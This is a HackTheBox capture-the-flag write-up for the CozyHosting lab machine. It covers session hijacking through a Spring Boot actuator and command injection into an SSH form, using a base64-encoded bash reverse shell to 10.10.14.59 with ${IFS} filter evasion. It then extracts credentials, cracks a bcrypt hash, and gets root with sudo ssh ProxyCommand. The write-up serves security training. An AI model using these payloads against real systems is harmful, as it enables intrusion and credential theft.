---
title: HackTheBox - CozyHosting
date: 2023-11-17 23:53:02
tags: [htb, ctf, writeup, ffuf, netcat, jd-gui, psql, hashcat]
category: writeups
description: cozyhosting htb writeup
---

# Tools

- ffuf
- cookie-editor extension
- netcat
- jd-gui
- psql
- hashcat
- ssh

<br>

## Getting User

### Nmap

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ sudo nmap -sS -oA nmap/initial_scan 10.129.229.88                                  
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 08:33 EST
Nmap scan report for 10.129.229.88
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ sudo nmap -sC -sV -p 22,80 -oA nmap/script_scan_scan 10.129.229.88
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 08:34 EST
Nmap scan report for 10.129.229.88
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<br>

### Foothold

add vhost to /etc/hosts

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/CozyHosting]
└─$ echo "10.129.229.88 cozyhosting.htb" | sudo tee -a /etc/hosts                         
10.129.229.88 cozyhosting.htb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


using ffuf to FUZZ directories

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└─$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://cozyhosting.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# on atleast 2 different hosts [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 182ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 187ms]
                        [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 187ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 188ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 189ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 200ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 202ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 202ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 223ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 237ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 240ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 246ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 261ms]
#                       [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 289ms]
# Copyright 2007 James Fisher [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 297ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 149ms]
admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 183ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 151ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 159ms]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Error page looks like Spring Boot.
I look up Spring Boot endpoints to see if there's any endpoint enabled.

we found the following endpoints, /executessh and /addhost in the /actuator/mappings and /actuator/session. 
/actuator/session shows us someone's session

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
2009DD9591A21581C1174F2E5FE0A172	"UNAUTHORIZED"
C1A6D76F24C4507346BE2B9C93AEF42C	"UNAUTHORIZED"
BD89D388C1156EC794B59AADEC369F99	"kanderson"
06379E06AC9D302E4C8269A20B50C986	"UNAUTHORIZED"
78030DBC852455916BED5A8C5A6D05DD	"UNAUTHORIZED"
7DA02EC01D1CC88BD83255B377C410EB	"UNAUTHORIZED"
090A6943402311CC802EEBCC3DD81038	"UNAUTHORIZED"
DA39596D4A7EB507146629B6E6575B70	"UNAUTHORIZED"
831039F943B2A0E29728CE3F80DE1C92	"UNAUTHORIZED"
AC5AF5AA92FA5ED69782B5B4696AE590	"UNAUTHORIZED"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Using cookie-editor extension, I'm going to change my JSESSIONID to *kanderson*'s, to access the /admin directory
There's a connection settings form which asks for *hostname* and *username* that might be be vulnerable to SSRF.
The form uses the endpoint **/executessh**

Entered **127.0.0.1** in hostname & **kanderson** in username.
Got *Host key verification failed.* error.

Let's create a bash reverse shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.59/1234 <&1'" | base64 -w 0
YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTkvMTIzNCA8JjEnCg==       
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Our shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo "YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTkvMTIzNCA8JjEnCg==" | base64 -d | bash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going to adjust the shell
First remove the spaces and replace them with **${IFS%??}** and add **;** to the start and end of the shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;echo${IFS%??}"YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNTkvMTIzNCA8JjEnCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Then convert the shell to URL encode. *(Using burpe, highlight the shell and press Ctrl+U)*

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
%3becho${IFS%25%3f%3f}"YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2bL2Rldi90Y3AvMTAuMTAuMTQuNTkvMTIzNCA8JjEnCg%3d%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Start listening on port 1234 using *nc* and send the execute the reverse shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.62.54] 45018
bash: cannot set terminal process group (999): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


There's a jar file which we can download and debug

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app@cozyhosting:/app$ ls
ls
cloudhosting-0.0.1.jar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Start a python http server and download the file to your machine

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app@cozyhosting:/app$ python3 -m http.server 1111
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/CozyHosting/files]
└─$ wget http://cozyhosting.htb:1111/cloudhosting-0.0.1.jar
--2023-11-15 10:14:09--  http://cozyhosting.htb:1111/cloudhosting-0.0.1.jar
Resolving cozyhosting.htb (cozyhosting.htb)... 10.129.62.54
Connecting to cozyhosting.htb (cozyhosting.htb)|10.129.62.54|:1111... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60259688 (57M) [application/java-archive]
Saving to: ‘cloudhosting-0.0.1.jar’

cloudhosting-0.0.1.jar                             100%[================================================================================================================>]  57.47M  2.12MB/s    in 18s     

2023-11-15 10:14:27 (3.28 MB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Use JD-GUI to decompile the *jar* file and read the source code.
*Java Decompiler* will open a GUI.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/CozyHosting/files]
└─$ jd-gui cloudhosting-0.0.1.jar                                                
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


we find *application.properties* which contains a postgresql username and password.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


*FakeUser.class* has *kanderson*'s website credentials

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
username=kanderson&password=MRdEQuv6~6P9
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


connect to psql

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app@cozyhosting:/app$ psql --host=localhost --username=postgres --dbname=cozyhosting
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

select * from users
;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


add admin's password to a file, and crack the password using hashcat

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(kali㉿kali)-[~/HTB/CozyHosting/files]
└─$ echo '''$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm''' > pass.txt 

┌──(kali㉿kali)-[~/HTB/CozyHosting/files]
└─$ hashid pass.txt       
--File 'pass.txt'--
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'pass.txt'--     

┌──(kali㉿kali)-[~/HTB/CozyHosting/files]
└─$ hashcat pass.txt -m 3200 /usr/share/wordlists/rockyou.txt  
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We find the josh's homefolder, so we can try the password to login to that user.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
app@cozyhosting:/app$ ls /home 
ls /home
josh

┌──(kali㉿kali)-[~]
└─$ ssh josh@cozyhosting.htb

josh@cozyhosting:~$ cat user.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<br>

## Getting Root

### Information Gathering

Looking at *sudo -l*, we have permission to run */usr/bin/ssh/*

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Sorry, try again.
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


<br>

### Privilege Escalation

Spawn a root shell using sudo ssh through ProxyCommand option

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# ls
user.txt
# sudo -l
Matching Defaults entries for root on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User root may run the following commands on localhost:
    (ALL : ALL) ALL
# cd /root
# ls
root.txt
# cat root.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


